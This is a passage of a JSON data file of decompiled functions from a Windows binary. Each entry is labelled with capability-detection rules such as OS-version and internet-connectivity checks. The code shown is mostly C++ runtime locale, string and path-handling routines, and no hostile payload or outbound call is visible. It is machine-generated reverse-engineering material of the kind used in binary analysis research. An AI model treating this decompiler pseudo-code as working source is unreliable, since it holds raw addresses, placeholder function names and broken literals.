>> 0x77, 0) & 1) << 0xe | (uVar16 >> 7) << 0xf;\n                uVar2 = uVar1;\n                uVar4 = SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (-(cVar14 == pcVar6[0x1f]) >> 7) << 0xf;\n                pcVar6 = pcVar5;\n            } while (uVar1 == 0);\n        }\n        uVar4 = uVar4 & (-uVar2 & uVar2) - 1;\n        uVar2 = 0x1f;\n        if (uVar4 != 0) {\n            for (; uVar4 >> uVar2 == 0; uVar2 = uVar2 - 1) {\n            }\n        }\n        if (uVar4 != 0) {\n            pauVar7 = pcVar5 + uVar2;\n        }\n    }\n    else {\n        while( true ) {\n            bVar8 = false;\n            bVar9 = (arg1 & 0xf) == 0;\n            if (bVar9) break;\n            if ((*arg1)[0] == arg2) {\n                pauVar7 = arg1;\n            }\n            if ((*arg1)[0] == '\\0') {\n                return pauVar7;\n            }\n            arg1 = *arg1 + 1;\n        }\n        while( true ) {\n            iVar3 = pcmpistri(ZEXT416(arg2 & 0xff), *arg1, 0x40);\n            if (bVar8) {\n                pauVar7 = *arg1 + iVar3;\n                bVar9 = pauVar7 == NULL;\n                pcmpistri(ZEXT416(arg2 & 0xff), *arg1, 0x40);\n            }\n            if (bVar9) break;\n            bVar8 = 0xffffffffffffffef < arg1;\n            arg1 = arg1[1];\n            bVar9 = arg1 == NULL;\n        }\n    }\n    return pauVar7;\n}\n",
        "token_count": 5229
    },
    "1800027f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1800027f0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    code **ppcVar6;\n    uint *puVar7;\n    ulong uVar8;\n    int64_t arg2_00;\n    uchar auStack184 [8];\n    int64_t iStack176;\n    uchar uStack168;\n    int64_t iStack160;\n    uchar uStack152;\n    int64_t iStack144;\n    ushort uStack136;\n    int64_t iStack128;\n    ushort uStack120;\n    int64_t iStack112;\n    uchar uStack104;\n    int64_t iStack96;\n    uchar uStack88;\n    ulong uStack80;\n    uchar auStack72 [48];\n    \n    uStack80 = 0xfffffffffffffffe;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar6 = fcn.18008fb2c(0x40);\n        iVar1 = *(arg2 + 8);\n        if (iVar1 == 0) {\n            arg2_00 = 0x1800f454f;\n        }\n        else {\n            arg2_00 = *(iVar1 + 0x28);\n            if (arg2_00 == 0) {\n                arg2_00 = iVar1 + 0x30;\n            }\n        }\n        fcn.18006da30(auStack184, 0);\n        iStack176 = 0;\n        uStack168 = 0;\n        iStack160 = 0;\n        uStack152 = 0;\n        iStack144 = 0;\n        uStack136 = 0;\n        iStack128 = 0;\n        uStack120 = 0;\n        iStack112 = 0;\n        uStack104 = 0;\n        iStack96 = 0;\n        uStack88 = 0;\n        if (arg2_00 == 0) {\n            fcn.18006dfd0(\"bad locale name\");\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        fcn.180073c8c(auStack184, arg2_00);\n        *(ppcVar6 + 1) = 0;\n        *ppcVar6 = vtable.std::codecvt_wchar_t__char__struct__Mbstatet_.0;\n        puVar7 = fcn.180074580(auStack72);\n        uVar3 = puVar7[1];\n        uVar4 = puVar7[2];\n        uVar5 = puVar7[3];\n        *(ppcVar6 + 2) = *puVar7;\n        *(ppcVar6 + 0x14) = uVar3;\n        *(ppcVar6 + 3) = uVar4;\n        *(ppcVar6 + 0x1c) = uVar5;\n        uVar3 = puVar7[5];\n        uVar4 = puVar7[6];\n        uVar5 = puVar7[7];\n        *(ppcVar6 + 4) = puVar7[4];\n        *(ppcVar6 + 0x24) = uVar3;\n        *(ppcVar6 + 5) = uVar4;\n        *(ppcVar6 + 0x2c) = uVar5;\n        ppcVar6[6] = *(puVar7 + 8);\n        *(ppcVar6 + 7) = puVar7[10];\n        *arg1 = ppcVar6;\n        fcn.180073cf8(auStack184);\n        if (iStack96 != 0) {\n            fcn.1800b2bb8(iStack96);\n        }\n        iStack96 = 0;\n        if (iStack112 != 0) {\n            fcn.1800b2bb8(iStack112);\n        }\n        iStack112 = 0;\n        if (iStack128 != 0) {\n            fcn.1800b2bb8(iStack128);\n        }\n        iStack128 = 0;\n        if (iStack144 != 0) {\n            fcn.1800b2bb8(iStack144);\n        }\n        iStack144 = 0;\n        if (iStack160 != 0) {\n            fcn.1800b2bb8(iStack160);\n        }\n        iStack160 = 0;\n        if (iStack176 != 0) {\n            fcn.1800b2bb8(iStack176);\n        }\n        iStack176 = 0;\n        fcn.18006dab0(auStack184);\n    }\n    return 2;\n}\n",
        "token_count": 1055
    },
    "180002d4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.180002d40(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    code **ppcVar6;\n    uint *puVar7;\n    ulong uVar8;\n    int64_t arg2_00;\n    uchar auStack168 [8];\n    int64_t iStack160;\n    uchar uStack152;\n    int64_t iStack144;\n    uchar uStack136;\n    int64_t iStack128;\n    ushort uStack120;\n    int64_t iStack112;\n    ushort uStack104;\n    int64_t iStack96;\n    uchar uStack88;\n    int64_t iStack80;\n    uchar uStack72;\n    ulong uStack64;\n    uchar auStack56 [32];\n    \n    uStack64 = 0xfffffffffffffffe;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar6 = fcn.18008fb2c(0x30);\n        iVar1 = *(arg2 + 8);\n        if (iVar1 == 0) {\n            arg2_00 = 0x1800f454f;\n        }\n        else {\n            arg2_00 = *(iVar1 + 0x28);\n            if (arg2_00 == 0) {\n                arg2_00 = iVar1 + 0x30;\n            }\n        }\n        fcn.18006da30(auStack168, 0);\n        iStack160 = 0;\n        uStack152 = 0;\n        iStack144 = 0;\n        uStack136 = 0;\n        iStack128 = 0;\n        uStack120 = 0;\n        iStack112 = 0;\n        uStack104 = 0;\n        iStack96 = 0;\n        uStack88 = 0;\n        iStack80 = 0;\n        uStack72 = 0;\n        if (arg2_00 == 0) {\n            fcn.18006dfd0(\"bad locale name\");\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        fcn.180073c8c(auStack168, arg2_00);\n        *(ppcVar6 + 1) = 0;\n        *ppcVar6 = vtable.std::ctype_char_.0;\n        puVar7 = fcn.18007417c(auStack56);\n        uVar3 = puVar7[1];\n        uVar4 = puVar7[2];\n        uVar5 = puVar7[3];\n        *(ppcVar6 + 2) = *puVar7;\n        *(ppcVar6 + 0x14) = uVar3;\n        *(ppcVar6 + 3) = uVar4;\n        *(ppcVar6 + 0x1c) = uVar5;\n        uVar3 = puVar7[5];\n        uVar4 = puVar7[6];\n        uVar5 = puVar7[7];\n        *(ppcVar6 + 4) = puVar7[4];\n        *(ppcVar6 + 0x24) = uVar3;\n        *(ppcVar6 + 5) = uVar4;\n        *(ppcVar6 + 0x2c) = uVar5;\n        *arg1 = ppcVar6;\n        fcn.180073cf8(auStack168);\n        if (iStack80 != 0) {\n            fcn.1800b2bb8(iStack80);\n        }\n        iStack80 = 0;\n        if (iStack96 != 0) {\n            fcn.1800b2bb8(iStack96);\n        }\n        iStack96 = 0;\n        if (iStack112 != 0) {\n            fcn.1800b2bb8(iStack112);\n        }\n        iStack112 = 0;\n        if (iStack128 != 0) {\n            fcn.1800b2bb8(iStack128);\n        }\n        iStack128 = 0;\n        if (iStack144 != 0) {\n            fcn.1800b2bb8(iStack144);\n        }\n        iStack144 = 0;\n        if (iStack160 != 0) {\n            fcn.1800b2bb8(iStack160);\n        }\n        iStack160 = 0;\n        fcn.18006dab0(auStack168);\n    }\n    return 2;\n}\n",
        "token_count": 1010
    },
    "18000308": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.180003080(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    code **ppcVar6;\n    uint *puVar7;\n    ulong uVar8;\n    int64_t arg2_00;\n    uchar auStack216 [8];\n    int64_t iStack208;\n    uchar uStack200;\n    int64_t iStack192;\n    uchar uStack184;\n    int64_t iStack176;\n    ushort uStack168;\n    int64_t iStack160;\n    ushort uStack152;\n    int64_t iStack144;\n    uchar uStack136;\n    int64_t iStack128;\n    uchar uStack120;\n    ulong uStack112;\n    uchar auStack104 [32];\n    uchar auStack72 [48];\n    \n    uStack112 = 0xfffffffffffffffe;\n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar6 = fcn.18008fb2c(0x60);\n        iVar1 = *(arg2 + 8);\n        if (iVar1 == 0) {\n            arg2_00 = 0x1800f454f;\n        }\n        else {\n            arg2_00 = *(iVar1 + 0x28);\n            if (arg2_00 == 0) {\n                arg2_00 = iVar1 + 0x30;\n            }\n        }\n        fcn.18006da30(auStack216, 0);\n        iStack208 = 0;\n        uStack200 = 0;\n        iStack192 = 0;\n        uStack184 = 0;\n        iStack176 = 0;\n        uStack168 = 0;\n        iStack160 = 0;\n        uStack152 = 0;\n        iStack144 = 0;\n        uStack136 = 0;\n        iStack128 = 0;\n        uStack120 = 0;\n        if (arg2_00 == 0) {\n            fcn.18006dfd0(\"bad locale name\");\n            pcVar2 = swi(3);\n            uVar8 = (*pcVar2)();\n            return uVar8;\n        }\n        fcn.180073c8c(auStack216, arg2_00);\n        *(ppcVar6 + 1) = 0;\n        *ppcVar6 = vtable.std::ctype_wchar_t_.0;\n        puVar7 = fcn.18007417c(auStack104);\n        uVar3 = puVar7[1];\n        uVar4 = puVar7[2];\n        uVar5 = puVar7[3];\n        *(ppcVar6 + 2) = *puVar7;\n        *(ppcVar6 + 0x14) = uVar3;\n        *(ppcVar6 + 3) = uVar4;\n        *(ppcVar6 + 0x1c) = uVar5;\n        uVar3 = puVar7[5];\n        uVar4 = puVar7[6];\n        uVar5 = puVar7[7];\n        *(ppcVar6 + 4) = puVar7[4];\n        *(ppcVar6 + 0x24) = uVar3;\n        *(ppcVar6 + 5) = uVar4;\n        *(ppcVar6 + 0x2c) = uVar5;\n        puVar7 = fcn.180074580(auStack72);\n        uVar3 = puVar7[1];\n        uVar4 = puVar7[2];\n        uVar5 = puVar7[3];\n        *(ppcVar6 + 6) = *puVar7;\n        *(ppcVar6 + 0x34) = uVar3;\n        *(ppcVar6 + 7) = uVar4;\n        *(ppcVar6 + 0x3c) = uVar5;\n        uVar3 = puVar7[5];\n        uVar4 = puVar7[6];\n        uVar5 = puVar7[7];\n        *(ppcVar6 + 8) = puVar7[4];\n        *(ppcVar6 + 0x44) = uVar3;\n        *(ppcVar6 + 9) = uVar4;\n        *(ppcVar6 + 0x4c) = uVar5;\n        ppcVar6[10] = *(puVar7 + 8);\n        *(ppcVar6 + 0xb) = puVar7[10];\n        *arg1 = ppcVar6;\n        fcn.180073cf8(auStack216);\n        if (iStack128 != 0) {\n            fcn.1800b2bb8(iStack128);\n        }\n        iStack128 = 0;\n        if (iStack144 != 0) {\n            fcn.1800b2bb8(iStack144);\n        }\n        iStack144 = 0;\n        if (iStack160 != 0) {\n            fcn.1800b2bb8(iStack160);\n        }\n        iStack160 = 0;\n        if (iStack176 != 0) {\n            fcn.1800b2bb8(iStack176);\n        }\n        iStack176 = 0;\n        if (iStack192 != 0) {\n            fcn.1800b2bb8(iStack192);\n        }\n        iStack192 = 0;\n        if (iStack208 != 0) {\n            fcn.1800b2bb8(iStack208);\n        }\n        iStack208 = 0;\n        fcn.18006dab0(auStack216);\n    }\n    return 2;\n}\n",
        "token_count": 1269
    },
    "1800036d": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\ncode ** fcn.1800036d0(code **arg1, int64_t arg2, uint *arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    code **ppcVar4;\n    int64_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uchar auStack88 [16];\n    uchar uStack72;\n    unkbyte7 Stack71;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    \n    uStack40 = 0xfffffffffffffffe;\n    auStack88 = CONCAT88(auStack88._0_8_, arg1);\n    uVar6 = *arg3;\n    uVar7 = arg3[1];\n    uVar8 = arg3[2];\n    uVar9 = arg3[3];\n    uStack56 = *0x180101910;\n    uStack52 = *0x180101914;\n    uStack48 = *0x180101918;\n    uStack44 = *0x18010191c;\n    uStack72 = 0;\n    iVar5 = -1;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (*(arg2 + iVar5) != '\\0');\n    fcn.180011120(&uStack72, arg2, iVar5);\n    auStack88 = CONCAT412(uVar9, CONCAT48(uVar8, CONCAT44(uVar7, uVar6)));\n    fcn.180001f90(arg1, auStack88, &uStack72);\n    uVar3 = CONCAT44(uStack44, uStack48);\n    if (0xf < uVar3) {\n        iVar2 = CONCAT71(Stack71, uStack72);\n        iVar5 = iVar2;\n        if (0xfff < uVar3 + 1) {\n            iVar5 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - iVar5) - 8U) {\n                fcn.1800b3528(iVar5, uVar3 + 0x28);\n                pcVar1 = swi(3);\n                ppcVar4 = (*pcVar1)();\n                return ppcVar4;\n            }\n        }\n        fcn.18008fb24(iVar5);\n    }\n    *arg1 = vtable.std::ios_base::failure.0;\n    return arg1;\n}\n",
        "token_count": 558
    },
    "180003eb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.180003eb0(void)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    ulong arg1;\n    ulong *puVar6;\n    uint64_t arg1_00;\n    int64_t iVar7;\n    int32_t iVar8;\n    uint64_t *puVar9;\n    uint64_t **ppuVar10;\n    int64_t iVar11;\n    ushort *arg3;\n    uchar auStack2424 [32];\n    uint uStack2392;\n    uint uStack2388;\n    uint uStack2384;\n    uint uStack2380;\n    uint uStack2376;\n    uint uStack2372;\n    uint uStack2368;\n    uint uStack2364;\n    ushort uStack2360;\n    unkbyte6 Stack2358;\n    int64_t iStack2344;\n    uint64_t uStack2336;\n    ulong uStack2328;\n    uchar auStack2312 [128];\n    ushort uStack2184;\n    unkbyte6 Stack2182;\n    uint uStack2168;\n    uint uStack2164;\n    uint uStack2160;\n    uint uStack2156;\n    int16_t aiStack2152 [264];\n    uchar auStack1624 [528];\n    uchar auStack1096 [528];\n    uchar auStack568 [528];\n    uint64_t uStack40;\n    ulong var_10h;\n    \n    uStack2328 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack2424;\n    fcn.1800ae290(auStack1624, 0, 0x208);\n    (**0x1800de7f0)(*0x18012a390, 0x849, 0x104, auStack1624);\n    (**0x1800de568)(auStack1624, 0x1800f4600);\n    (**0x1800de7f0)(*0x18012a390, 0x816, 0x104, 0x180124910);\n    iVar5 = (**0x1800de570)(0x180124910);\n    if (iVar5 == 0) {\n        (**0x1800de4a8)(0x180124910, 0);\n    }\n    (**0x1800de568)(0x180124910, 0x1800f4618);\n    iVar5 = (**0x1800de570)(0x180124910);\n    if (iVar5 == 0) {\n        (**0x1800de4a8)(0x180124910, 0);\n    }\n    (**0x1800de580)(0x180124b18, 0x180124910);\n    iVar5 = (**0x1800de570)(0x180124b18);\n    if (iVar5 == 0) {\n        (**0x1800de4a8)(0x180124b18, 0);\n    }\n    uStack2168 = *0x180101900;\n    uStack2164 = *0x180101904;\n    uStack2160 = *0x180101908;\n    uStack2156 = *0x18010190c;\n    iVar8 = 0;\n    uStack2184 = 0;\n    fcn.180010d70(&uStack2184, L\"default_\", 8);\n    (**0x1800de580)(auStack1096, 0x180124910, 0x1800f4658);\n    (**0x1800de580)(aiStack2152, 0x180124910, 0x1800f4670);\n    iVar5 = (**0x1800de570)(auStack1096);\n    if ((iVar5 != 0) && (iVar5 = (**0x1800de570)(aiStack2152),  iVar5 == 0)) {\n        (**0x1800de470)(auStack1096, aiStack2152);\n    }\n    puVar9 = 0x1801254d0;\n    do {\n        ppuVar10 = puVar9 + -0x33;\n        if (7 < puVar9[-0x30]) {\n            ppuVar10 = *ppuVar10;\n        }\n        (**0x1800de580)(aiStack2152, 0x180124910, ppuVar10);\n        iStack2344 = 0;\n        uStack2336 = 7;\n        uStack2360 = 0;\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (aiStack2152[iVar11] != 0);\n        fcn.180010d70(&uStack2360, aiStack2152, iVar11);\n        fcn.18000d960(iVar8 * 0x20 + 0x1801253f8, &uStack2360);\n        if (7 < uStack2336) {\n            iVar7 = CONCAT62(Stack2358, uStack2360);\n            iVar11 = iVar7;\n            if ((0xfff < uStack2336 * 2 + 2) && (iVar11 = *(iVar7 + -8),  0x1f < (iVar7 - iVar11) - 8U))\n            goto code_r0x0001800044ff;\n            fcn.18008fb24(iVar11);\n        }\n        iStack2344 = 0;\n        uStack2336 = 7;\n        uStack2360 = 0;\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (aiStack2152[iVar11] != 0);\n        fcn.180010d70(&uStack2360, aiStack2152, iVar11);\n        arg1 = fcn.1800687b0(auStack2312);\n        arg3 = &uStack2360;\n        if (7 < uStack2336) {\n            arg3 = CONCAT62(Stack2358, uStack2360);\n        }\n        fcn.180068c50(arg1, &uStack2392, arg3, arg3 + iStack2344);\n        fcn.1800686c0(auStack2312);\n        puVar1 = puVar9 + -3;\n        if (puVar1 == &uStack2392) {\n            if (0xf < CONCAT44(uStack2364, uStack2368)) {\n                iVar7 = CONCAT44(uStack2388, uStack2392);\n                iVar11 = iVar7;\n                if ((0xfff < CONCAT44(uStack2364, uStack2368) + 1) &&\n                   (iVar11 = *(iVar7 + -8),  0x1f < (iVar7 - iVar11) - 8U)) goto code_r0x000180004505;\n                fcn.18008fb24(iVar11);\n            }\n        }\n        else {\n            if (0xf < *puVar9) {\n                uVar2 = *puVar1;\n                arg1_00 = uVar2;\n                if ((0xfff < *puVar9 + 1) && (arg1_00 = *(uVar2 - 8),  0x1f < (uVar2 - arg1_00) - 8))\n                goto code_r0x000180004505;\n                fcn.18008fb24(arg1_00);\n            }\n            *puVar1 = uStack2392;\n            *(puVar9 + -0x14) = uStack2388;\n            *(puVar9 + -2) = uStack2384;\n            *(puVar9 + -0xc) = uStack2380;\n            *(puVar9 + -1) = uStack2376;\n            *(puVar9 + -4) = uStack2372;\n            *puVar9 = uStack2368;\n            *(puVar9 + 4) = uStack2364;\n        }\n        if (7 < uStack2336) {\n            iVar7 = CONCAT62(Stack2358, uStack2360);\n            iVar11 = iVar7;\n            if ((0xfff < uStack2336 * 2 + 2) && (iVar11 = *(iVar7 + -8),  0x1f < (iVar7 - iVar11) - 8U))\n            goto code_r0x00018000450b;\n            fcn.18008fb24(iVar11);\n        }\n        iVar5 = (**0x1800de570)(aiStack2152);\n        if (iVar5 == 0) {\n            puVar6 = fcn.1800125d0(&uStack2392, &uStack2184, iVar8 * 0x20 + 0x180125338);\n            if (7 < puVar6[3]) {\n                puVar6 = *puVar6;\n            }\n            (**0x1800de580)(auStack568, auStack1624, puVar6);\n            if (7 < CONCAT44(uStack2364, uStack2368)) {\n                iVar11 = CONCAT44(uStack2364, uStack2368) * 2;\n                iVar4 = CONCAT44(uStack2388, uStack2392);\n                iVar7 = iVar4;\n                if (0xfff < iVar11 + 2U) {\n                    iVar7 = *(iVar4 + -8);\n                    if (0x1f < (iVar4 - iVar7) - 8U) {\n                        fcn.1800b3528(iVar7, iVar11 + 0x29);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(iVar7);\n            }\n            (**0x1800de488)(auStack568, aiStack2152, 1);\n        }\n        iVar8 = iVar8 + 1;\n        puVar9 = puVar9 + 4;\n    } while (iVar8 < 6);\n    fcn.180004730();\n    puVar6 = fcn.1800125d0(&uStack2392, &uStack2184, 0x180125338);\n    if (7 < puVar6[3]) {\n        puVar6 = *puVar6;\n    }\n    (**0x1800de580)(0x180124d20, auStack1624, puVar6);\n    if (7 < CONCAT44(uStack2364, uStack2368)) {\n        iVar7 = CONCAT44(uStack2388, uStack2392);\n        iVar11 = iVar7;\n        if ((0xfff < CONCAT44(uStack2364, uStack2368) * 2 + 2) &&\n           (iVar11 = *(iVar7 + -8),  0x1f < (iVar7 - iVar11) - 8U)) goto code_r0x0001800044f9;\n        fcn.18008fb24(iVar11);\n    }\n    puVar6 = fcn.1800125d0(&uStack2392, &uStack2184, 0x180125358);\n    if (7 < puVar6[3]) {\n        puVar6 = *puVar6;\n    }\n    (**0x1800de580)(0x180124f28, auStack1624, puVar6);\n    if (7 < CONCAT44(uStack2364, uStack2368)) {\n        iVar11 = CONCAT44(uStack2364, uStack2368) * 2;\n        iVar4 = CONCAT44(uStack2388, uStack2392);\n        iVar7 = iVar4;\n        if (0xfff < iVar11 + 2U) {\n            iVar7 = *(iVar4 + -8);\n            if (0x1f < (iVar4 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, iVar11 + 0x29);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    puVar6 = fcn.1800125d0(&uStack2392, &uStack2184, \"p\\v\u036e|\\x02\");\n    if (7 < puVar6[3]) {\n        puVar6 = *puVar6;\n    }\n    (**0x1800de580)(0x180125130, auStack1624, puVar6);\n    if (7 < CONCAT44(uStack2364, uStack2368)) {\n        iVar11 = CONCAT44(uStack2364, uStack2368) * 2;\n        iVar4 = CONCAT44(uStack2388, uStack2392);\n        iVar7 = iVar4;\n        if (0xfff < iVar11 + 2U) {\n            iVar7 = *(iVar4 + -8);\n            if (0x1f < (iVar4 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, iVar11 + 0x29);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    if (7 < CONCAT44(uStack2156, uStack2160)) {\n        iVar11 = CONCAT44(uStack2156, uStack2160) * 2;\n        iVar4 = CONCAT62(Stack2182, uStack2184);\n        iVar7 = iVar4;\n        if (0xfff < iVar11 + 2U) {\n            iVar7 = *(iVar4 + -8);\n            if (0x1f < (iVar4 - iVar7) - 8U) {\n                fcn.1800b3528(iVar7, iVar11 + 0x29);\ncode_r0x0001800044f9:\n                fcn.1800b3528();\ncode_r0x0001800044ff:\n                fcn.1800b3528();\ncode_r0x000180004505:\n                fcn.1800b3528();\ncode_r0x00018000450b:\n                fcn.1800b3528();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar7);\n    }\n    fcn.18008fb00(uStack40 ^ auStack2424);\n    return;\n}\n",
        "token_count": 3185
    },
    "18000453": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180004530(ulong noname_0, int64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    ushort *arg3;\n    uchar auStack296 [32];\n    ushort uStack264;\n    unkbyte6 Stack262;\n    int64_t iStack248;\n    uint64_t uStack240;\n    uchar auStack224 [32];\n    ulong uStack192;\n    uchar auStack184 [128];\n    uchar uStack56;\n    unkbyte7 Stack55;\n    ulong uStack40;\n    uint64_t uStack32;\n    uint64_t uStack24;\n    \n    uStack192 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack296;\n    uStack40 = *0x180101910;\n    uStack32 = *0x180101918;\n    uStack56 = 0;\n    if (*(arg2 + 0x10) == 0) {\n        fcn.180004730(*0x180101910);\n    }\n    else {\n        puVar6 = auStack224;\n        uVar4 = fcn.18000de50(puVar6, 0x1801254b8);\n        iVar3 = fcn.180008d40(puVar6, &uStack56, uVar4);\n        if (0 < iVar3) {\n            iVar5 = fcn.18000db20(&uStack56, arg2, 0);\n            if (iVar5 != -1) {\n                fcn.180004730();\n                goto code_r0x0001800046c3;\n            }\n        }\n        iStack248 = 0;\n        uStack240 = 7;\n        uStack264 = 0;\n        iVar5 = -1;\n        do {\n            iVar5 = iVar5 + 1;\n        } while (*(iVar5 * 2 + 0x180124d20) != 0);\n        fcn.180010d70(&uStack264, 0x180124d20, iVar5);\n        uVar4 = fcn.1800687b0(auStack184);\n        arg3 = &uStack264;\n        if (7 < uStack240) {\n            arg3 = CONCAT62(Stack262, uStack264);\n        }\n        fcn.180068c50(uVar4, auStack224, arg3, arg3 + iStack248);\n        puVar6 = auStack184;\n        fcn.1800686c0(puVar6);\n        iVar3 = fcn.180008d40(puVar6, &uStack56, auStack224);\n        if (7 < uStack240) {\n            iVar2 = CONCAT62(Stack262, uStack264);\n            iVar5 = iVar2;\n            if ((0xfff < uStack240 * 2 + 2) && (iVar5 = *(iVar2 + -8),  0x1f < (iVar2 - iVar5) - 8U))\n            goto code_r0x000180004723;\n            fcn.18008fb24(iVar5);\n        }\n        if (0 < iVar3) {\n            iVar5 = fcn.18000db20(&uStack56, arg2, 0);\n            if (iVar5 != -1) {\n                fcn.1800047e0();\n                goto code_r0x0001800046c3;\n            }\n        }\n        fcn.180004730();\n    }\ncode_r0x0001800046c3:\n    if (0xf < uStack32) {\n        iVar2 = CONCAT71(Stack55, uStack56);\n        iVar5 = iVar2;\n        if (0xfff < uStack32 + 1) {\n            iVar5 = *(iVar2 + -8);\n            if (0x1f < (iVar2 - iVar5) - 8U) {\n                fcn.1800b3528(iVar5, uStack32 + 0x28);\ncode_r0x000180004723:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(iVar5);\n    }\n    fcn.18008fb00(uStack24 ^ auStack296);\n    return;\n}\n",
        "token_count": 966
    },
    "1800047e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800047e0(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong arg1;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ushort *arg3;\n    ushort uStack216;\n    unkbyte6 Stack214;\n    int64_t iStack200;\n    uint64_t uStack192;\n    ulong uStack184;\n    int64_t aiStack176 [3];\n    uint64_t uStack152;\n    uchar auStack136 [128];\n    \n    uStack184 = 0xfffffffffffffffe;\n    iStack200 = CONCAT44(*0x180101904, *0x180101900);\n    uStack192 = CONCAT44(*0x18010190c, *0x180101908);\n    uStack216 = 0;\n    iVar4 = -1;\n    iVar5 = -1;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (*(iVar5 * 2 + 0x180124d20) != 0);\n    fcn.180010d70(&uStack216, 0x180124d20, iVar5);\n    fcn.18000d960(0x180125578, &uStack216);\n    if (uStack192 < 8) {\ncode_r0x000180004896:\n        iStack200 = 0;\n        uStack192 = 7;\n        uStack216 = 0;\n        iVar5 = -1;\n        do {\n            iVar5 = iVar5 + 1;\n        } while (*(iVar5 * 